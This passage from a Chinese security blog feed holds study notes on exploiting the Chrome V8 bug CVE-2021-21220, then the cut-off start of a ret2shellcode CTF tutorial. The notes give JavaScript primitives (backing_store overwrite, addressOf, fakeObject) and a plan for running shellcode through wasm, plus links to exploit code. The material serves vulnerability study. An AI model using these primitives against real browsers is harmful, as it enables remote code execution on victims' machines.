&lt;h2 id=&#34;越界访问rwarr数组-实现可控的JSArrayBuffer&#34;&gt;&lt;a href=&#34;#越界访问rwarr数组-实现可控的JSArrayBuffer&#34; class=&#34;headerlink&#34; title=&#34;越界访问rwarr数组(实现可控的JSArrayBuffer)&#34;&gt;&lt;/a&gt;越界访问rwarr数组(实现可控的JSArrayBuffer)&lt;/h2&gt;&lt;p&gt;  这张图比较形象,我们现在可以越界访问的是corrupt_arr,然后新建了一个rwarr数组,那么可以越界访问,把rwarr的长度修改的大一点,对应代码 corrput_arr[12] &amp;#x3D; 0x22444;&lt;/p&gt;
&lt;p&gt;  那么为什么数组的第13位是代表着它的长度呢?这个具体原理方法在参考博客里,和它的数据结构有关.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/chrome_v8_CVE-2021-21220_%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/Untitled_3.png&#34; alt=&#34;Untitled_3&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;越界访问corrupt-buff-实现任意地址读写&#34;&gt;&lt;a href=&#34;#越界访问corrupt-buff-实现任意地址读写&#34; class=&#34;headerlink&#34; title=&#34;越界访问corrupt_buff(实现任意地址读写)&#34;&gt;&lt;/a&gt;&lt;strong&gt;&lt;strong&gt;越界访问corrupt_buff(实现任意地址读写)&lt;/strong&gt;&lt;/strong&gt;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;http://www.hackdig.com/03/hack-70813.htm&#34;&gt;http://www.hackdig.com/03/hack-70813.htm&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;  背景知识:什么是backing_store? 对漏洞利用有什么用?&lt;/p&gt;
&lt;p&gt;  backing_store指向初始化JSArrayBuffer时用户申请大小的堆，如果我们控制了一个JSArrayBuffer相当于一个指针和指针的内容可以同时改写。这样我们改写backing_store读取控制的JSArrayBuffer的内容就是任意地址读；我们改写backing_store修改控制的JSArrayBuffer的内容就是任意地址写。&lt;/p&gt;
&lt;p&gt;  如果我们将这个backing_store指针修改为我们想要写入的内存地址，那么我们再调用view.setUint32(0, poc, true) 类似指令时，实际上就是向指定内存地址处写入了poc，从而达到任意地址写。&lt;/p&gt;
&lt;h3 id=&#34;任意地址写-通过伪造backing-store&#34;&gt;&lt;a href=&#34;#任意地址写-通过伪造backing-store&#34; class=&#34;headerlink&#34; title=&#34;任意地址写(通过伪造backing_store)&#34;&gt;&lt;/a&gt;任意地址写(通过伪造backing_store)&lt;/h3&gt;&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;function &lt;span class=&#34;title function_&#34;&gt;setbackingStore&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(hi, low)&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;           rwarr[&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;] = i2f(fLow(rwarr[&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;]), hi);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;           rwarr[&lt;span class=&#34;number&#34;&gt;5&lt;/span&gt;] = i2f(low, fHi(rwarr[&lt;span class=&#34;number&#34;&gt;5&lt;/span&gt;]));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;       &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;   从corrupt_buff中声明一个Dataview,而backing_store记录的就是实际DataView的内存地址。如果我们将这个backing_store指针修改为我们想要写入的内存地址，那么我们再调用view.setUint32(0, poc, true) 类似指令时，实际上就是向指定内存地址处写入了poc，从而达到任意地址写。&lt;/p&gt;
&lt;p&gt;  那么我们已经可以利用rwarr实现对corrupt_buff的任意读写,即可以任意修改backing_store.&lt;/p&gt;
&lt;h3 id=&#34;任意地址读-类型混淆&#34;&gt;&lt;a href=&#34;#任意地址读-类型混淆&#34; class=&#34;headerlink&#34; title=&#34;任意地址读(类型混淆)&#34;&gt;&lt;/a&gt;任意地址读(类型混淆)&lt;/h3&gt;&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;function &lt;span class=&#34;title function_&#34;&gt;leakObjLow&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(o)&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;           corrupt_buff.slot = o;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;           &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; (fLow(rwarr[&lt;span class=&#34;number&#34;&gt;9&lt;/span&gt;]) - &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;       &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;  leakObjLow函数使用corrupt_buff的slot属性，修改该属性为某一对象o，那么o的地址就会被写入到corrupt_buff所在的内存区间中，然后利用rwarr的溢出访问该值，实现泄露。&lt;/p&gt;
&lt;p&gt;  这里是不是用了类型混淆??&lt;/p&gt;
&lt;h3 id=&#34;利用oob造成类型混淆-那怎么利用呢&#34;&gt;&lt;a href=&#34;#利用oob造成类型混淆-那怎么利用呢&#34; class=&#34;headerlink&#34; title=&#34;利用oob造成类型混淆,那怎么利用呢?&#34;&gt;&lt;/a&gt;利用oob造成类型混淆,那怎么利用呢?&lt;/h3&gt;&lt;p&gt;那出现类型混淆怎么利用呢？举个例子，如果我们定义一个FloatArray浮点数数组A，然后定义一个对象数组B。正常情况下，访问A[0]返回的是一个浮点数，访问B[0]返回的是一个对象元素。如果将B的类型修改为A的类型，那么再次访问B[0]时，返回的就不是对象元素B[0]，而是B[0]对象元素转换为浮点数即B[0]对象的内存地址了；如果将A的类型修改为B的类型，那么再次访问A[0]时，返回的就不是浮点数A[0]，而是以A[0]为内存地址的一个JavaScript对象了。&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.freebuf.com/vuls/203721.html&#34;&gt;https://www.freebuf.com/vuls/203721.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;addressOf 泄露某个对象的内存地址&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;// 泄露某个object的地址&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;function &lt;span class=&#34;title function_&#34;&gt;addressOf&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(obj_to_leak)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    obj_array[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;] = obj_to_leak;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    obj_array.oob(float_array_map);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    let obj_addr = f2i(obj_array[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;]) - &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;n;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    obj_array.oob(obj_array_map); &lt;span class=&#34;comment&#34;&gt;// 还原array类型以便后续继续使用&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; obj_addr;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;strong&gt;fakeObject 将指定内存强制转换为一个js对象(有什么用呢?)&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;// 将某个addr强制转换为object对象&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;function &lt;span class=&#34;title function_&#34;&gt;fakeObject&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(addr_to_fake)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    float_array[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;] = i2f(addr_to_fake + &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;n);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    float_array.oob(obj_array_map);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    let faked_obj = float_array[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    float_array.oob(float_array_map); &lt;span class=&#34;comment&#34;&gt;// 还原array类型以便后续继续使用&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; faked_obj;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&#34;如何实现任意地址读写：构造AAR-x2F-AAW原语&#34;&gt;&lt;a href=&#34;#如何实现任意地址读写：构造AAR-x2F-AAW原语&#34; class=&#34;headerlink&#34; title=&#34;如何实现任意地址读写：构造AAR&amp;#x2F;AAW原语&#34;&gt;&lt;/a&gt;&lt;strong&gt;&lt;strong&gt;如何实现任意地址读写：构造AAR&amp;#x2F;AAW原语&lt;/strong&gt;&lt;/strong&gt;&lt;/h3&gt;&lt;p&gt;&lt;a href=&#34;https://paper.seebug.org/1821/#wasm&#34;&gt;https://paper.seebug.org/1821/#wasm&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;fakeObject强制将一块内存伪造成一个数组对象??? 它的elements 指针是可控的,而这个指针指向了存储数组元素内容的内存地址。如果我们将这个指针修改为我们想要访问的内存地址，那后续我们访问这个数组对象的内容,实际上访问的就是我们修改后的内存地址指向的内容，这样也就实现了对任意指定地址的内存访问读写效果了。&lt;/p&gt;
&lt;p&gt;哦哦哦因为可以任意访问,把这个当成一个数组对象了,那么对这个数组,我们是可以任意读取和修改的????&lt;/p&gt;
&lt;h2 id=&#34;wasm-webassembly-实现执行shellcode&#34;&gt;&lt;a href=&#34;#wasm-webassembly-实现执行shellcode&#34; class=&#34;headerlink&#34; title=&#34;wasm(webassembly) 实现执行shellcode&#34;&gt;&lt;/a&gt;wasm(webassembly) 实现执行shellcode&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://paper.seebug.org/1821/#wasm&#34;&gt;https://paper.seebug.org/1821/#wasm&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.freebuf.com/vuls/203721.html&#34;&gt;https://www.freebuf.com/vuls/203721.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;简单来说，wasm就是可以让JavaScript直接执行高级语言生成的机器码的一种技术。&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://sensepost.com/blog/2018/introduction-to-webassembly/&#34;&gt;https://sensepost.com/blog/2018/introduction-to-webassembly/&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&#34;利用思路&#34;&gt;&lt;a href=&#34;#利用思路&#34; class=&#34;headerlink&#34; title=&#34;利用思路&#34;&gt;&lt;/a&gt;利用思路&lt;/h3&gt;&lt;p&gt;首先加载一段wasm代码到内存中&lt;br&gt;然后通过addresssOf原语找到存放wasm的内存地址&lt;br&gt;接着通过任意地址写原语用shellcode替换原本wasm的代码内容&lt;br&gt;最后调用wasm的函数接口即可触发调用shellcode&lt;/p&gt;
&lt;h1 id=&#34;参考资料&#34;&gt;&lt;a href=&#34;#参考资料&#34; class=&#34;headerlink&#34; title=&#34;参考资料&#34;&gt;&lt;/a&gt;参考资料&lt;/h1&gt;&lt;h2 id=&#34;漏洞复现参考&#34;&gt;&lt;a href=&#34;#漏洞复现参考&#34; class=&#34;headerlink&#34; title=&#34;漏洞复现参考&#34;&gt;&lt;/a&gt;漏洞复现参考&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/m0_56642842/article/details/118358830&#34;&gt;https://blog.csdn.net/m0_56642842&amp;#x2F;article&amp;#x2F;details&amp;#x2F;118358830&lt;/a&gt; 这个就是教你怎么复现,不涉及原理&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.cnblogs.com/7omss/p/15661338.html&#34;&gt;https://www.cnblogs.com/7omss/p/15661338.html&lt;/a&gt; + 1&lt;/p&gt;
&lt;p&gt;exploit:&lt;a href=&#34;https://share.weiyun.com/EXlNm02A&#34;&gt;https://share.weiyun.com/EXlNm02A&lt;/a&gt; &lt;/p&gt;
&lt;p&gt;浏览器:&lt;a href=&#34;https://share.weiyun.com/fZLcxFe9&#34;&gt;https://share.weiyun.com/fZLcxFe9&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;漏洞分析、调试及RCE步骤参考&#34;&gt;&lt;a href=&#34;#漏洞分析、调试及RCE步骤参考&#34; class=&#34;headerlink&#34; title=&#34;漏洞分析、调试及RCE步骤参考&#34;&gt;&lt;/a&gt;漏洞分析、调试及RCE步骤参考&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://zhuanlan.zhihu.com/p/365297858&#34;&gt;https://zhuanlan.zhihu.com/p/365297858&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/smellycat000/article/details/116078164&#34;&gt;https://blog.csdn.net/smellycat000/article/details/116078164&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.zerodayinitiative.com/blog/2021/12/15/exploitation-of-cve-2021-21220-from-incorrect-jit-behavior-to-rce&#34;&gt;https://www.zerodayinitiative.com/blog/2021/12/15/exploitation-of-cve-2021-21220-from-incorrect-jit-behavior-to-rce&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://doar-e.github.io/blog/2019/01/28/introduction-to-turbofan/&#34;&gt;https://doar-e.github.io/blog/2019/01/28/introduction-to-turbofan/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/security-dbg/CVE-2021-21220/blob/main/exploit.js&#34;&gt;https://github.com/security-dbg/CVE-2021-21220/blob/main/exploit.js&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://buaq.net/go-97833.html&#34;&gt;https://buaq.net/go-97833.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://ruan777.github.io/2022/01/18/chrome-cve-2021-21220%E5%88%86%E6%9E%90/&#34;&gt;https://ruan777.github.io/2022/01/18/chrome-cve-2021-21220分析/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/Bounty-Team/Bounty-Team.github.io/blob/e0f717119de0c8a46aef0bde3e2bf2a4a9fe71bc/_posts/2021-04-16-CVE-2021-21220.md&#34;&gt;https://github.com/Bounty-Team/Bounty-Team.github.io/blob/e0f717119de0c8a46aef0bde3e2bf2a4a9fe71bc/_posts&amp;#x2F;2021-04-16-CVE-2021-21220.md&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.zerodayinitiative.com/blog/2021/12/15/exploitation-of-cve-2021-21220-from-incorrect-jit-behavior-to-rce&#34;&gt;https://www.zerodayinitiative.com/blog/2021/12/15/exploitation-of-cve-2021-21220-from-incorrect-jit-behavior-to-rce&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/singularseclab/Slides/blob/main/2021/chrome_exploitation-zer0con2021.pdf&#34;&gt;https://github.com/singularseclab/Slides/blob/main/2021/chrome_exploitation-zer0con2021.pdf&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.sohu.com/a/383228797_354899&#34;&gt;https://www.sohu.com/a/383228797_354899&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://bounty-team.github.io/vulnerability%20analysis/2021/04/16/CVE-2021-21220/&#34;&gt;https://bounty-team.github.io/vulnerability analysis/2021/04/16/CVE-2021-21220/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.freebuf.com/vuls/269629.html&#34;&gt;https://www.freebuf.com/vuls/269629.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.cjovi.icu/CVE/1586.html&#34;&gt;https://www.cjovi.icu/CVE/1586.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://xz.aliyun.com/t/5190&#34;&gt;https://xz.aliyun.com/t/5190&lt;/a&gt;。&lt;strong&gt;v8 exploit入门[PlaidCTF roll a d8]&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://gtoad.github.io/2019/07/25/V8-Debug/&#34;&gt;https://gtoad.github.io/2019/07/25/V8-Debug/&lt;/a&gt;  &lt;strong&gt;&lt;strong&gt;V8引擎漏洞分析环境与调试方法基础&lt;/strong&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://paper.seebug.org/1850/&#34;&gt;https://paper.seebug.org/1850/&lt;/a&gt;   &lt;strong&gt;&lt;strong&gt;从 0 开始学 V8 漏洞利用之 CVE-2021-21220（八）&lt;/strong&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.freebuf.com/vuls/230182.html&#34;&gt;https://www.freebuf.com/vuls/230182.html&lt;/a&gt;。&lt;strong&gt;&lt;strong&gt;v8利用入门：从越界访问到RCE&lt;/strong&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.freebuf.com/vuls/203721.html&#34;&gt;https://www.freebuf.com/vuls/203721.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.cjovi.icu/CVE/1586.html&#34;&gt;https://www.cjovi.icu/CVE/1586.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://tiszka.com/blog/CVE_2021_21225.html&#34;&gt;https://tiszka.com/blog/CVE_2021_21225.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://kiprey.github.io/2021/01/v8-turboFan/&#34;&gt;https://kiprey.github.io/2021/01/v8-turboFan/&lt;/a&gt;&lt;/p&gt;
</content>
        <category term="浏览器安全" />
        <updated>2022-11-17T14:20:59.000Z</updated>
    </entry>
    <entry>
        <id>https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-2-ret2shellcode/</id>
        <title>pwn入门-2-ret2shellcode</title>
        <link rel="alternate" href="https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-2-ret2shellcode/"/>
        <content type="html">&lt;h1 id=&#34;ctfwiki的例子&#34;&gt;&lt;a href=&#34;#ctfwiki的例子&#34; class=&#34;headerlink&#34; title=&#34;ctfwiki的例子&#34;&gt;&lt;/a&gt;ctfwiki的例子&lt;/h1&gt;&lt;p&gt;bamboofox 中的 ret2shellcode:&lt;/p&gt;
&lt;p&gt;需要有可读可写可执行的段,将shellcode写入这里,然后执行shellcode&lt;/p&gt;
&lt;p&gt;这道题其实是给的一种很简单的方法,直接把shellcode写入了bss段,然后这个段是可读可写可执行的&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;.bss:&lt;span class=&#34;number&#34;&gt;0804&lt;/span&gt;A065                 align &lt;span class=&#34;number&#34;&gt;20&lt;/span&gt;h&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.bss:&lt;span class=&#34;number&#34;&gt;0804&lt;/span&gt;A080                 public buf2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.bss:&lt;span class=&#34;number&#34;&gt;0804&lt;/span&gt;A080 ; &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; buf2[&lt;span class=&#34;number&#34;&gt;100&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.bss:&lt;span class=&#34;number&#34;&gt;0804&lt;/span&gt;A080 buf2            db &lt;span class=&#34;number&#34;&gt;64&lt;/span&gt;h &lt;span class=&#34;title function_&#34;&gt;dup&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(?)&lt;/span&gt;           ; DATA XREF: main+&lt;span class=&#34;number&#34;&gt;7B&lt;/span&gt;↑o&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.bss:&lt;span class=&#34;number&#34;&gt;0804&lt;/span&gt;A080 _bss            ends&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.bss:&lt;span class=&#34;number&#34;&gt;0804&lt;/span&gt;A080&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;





&lt;h3 id=&#34;查看各个段的属性&#34;&gt;&lt;a href=&#34;#查看各个段的属性&#34; class=&#34;headerlink&#34; title=&#34;查看各个段的属性&#34;&gt;&lt;/a&gt;查看各个段的属性&lt;/h3&gt;&lt;p&gt;方法一:在gdb中调试,启动程序后用vmmap&lt;/p&gt;
&lt;p&gt;.bss:0804A080  对应着 0x804a000 0x804b000 0x001000 rwx &amp;#x2F;home&amp;#x2F;ubuntu&amp;#x2F;shellcode&amp;#x2F;ret2shellcode&lt;/p&gt;
&lt;p&gt;可读可写可执行&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;gef➤  vmmap&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[ Legend:  Code | Heap | Stack ]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Start      End        Offset     Perm Path&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x8048000&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x8049000&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x000000&lt;/span&gt; r-x /home/ubuntu/shellcode/ret2shellcode&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x8049000&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x804a000&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x000000&lt;/span&gt; r-x /home/ubuntu/shellcode/ret2shellcode&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x804a000&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x804b000&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x001000&lt;/span&gt; rwx /home/ubuntu/shellcode/ret2shellcode&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0xf7de5000&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0xf7fba000&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x000000&lt;/span&gt; r-x /lib/i386-linux-gnu/libc&lt;span class=&#34;number&#34;&gt;-2.27&lt;/span&gt;.so&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0xf7fba000&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0xf7fbb000&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x1d5000&lt;/span&gt; --- /lib/i386-linux-gnu/libc&lt;span class=&#34;number&#34;&gt;-2.27&lt;/span&gt;.so&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span 